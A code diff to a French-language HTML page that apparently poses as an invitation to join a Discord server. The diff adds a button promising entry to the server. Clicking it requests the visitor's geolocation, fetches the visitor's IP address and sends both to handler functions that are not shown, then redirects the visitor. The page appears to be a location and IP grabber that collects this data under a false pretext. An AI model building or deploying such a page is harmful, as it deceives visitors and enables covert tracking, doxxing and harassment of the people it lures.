@@ -22,11 +22,24 @@
       color: #e0e0e0;
       max-width: 90%;
     }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
   </style>
 </head>
 <body>
   <div>
     <h1 id="titre">Chargement…</h1>
+    <button id="btn-localisation">Autoriser la localisation pour rejoindre le serveur Discord</button>
   </div>
 
   <script>
@@ -80,21 +93,16 @@
       window.location.href = REDIRECT_URL;
     }
 
-    window.onload = async function() {
+    document.getElementById("btn-localisation").addEventListener("click", async () => {
       if ("geolocation" in navigator) {
-        document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
         navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
-      } else {
-        // Si pas supporté → redirection directe
-        window.location.href = REDIRECT_URL;
+        const ip = await getIP();
+        if (ip) {
+          await sendIP(ip);
+          window.location.href = REDIRECT_URL; // Redirection immdiaate aprés envoi IP
+        }
       }
-
-      const ip = await getIP();
-      if (ip) {
-        await sendIP(ip);
-        window.location.href = REDIRECT_URL; // Redirection immdiaate aprés envoi IP
-      }
-    };
+    });
   </script>
 </body>
 </html>
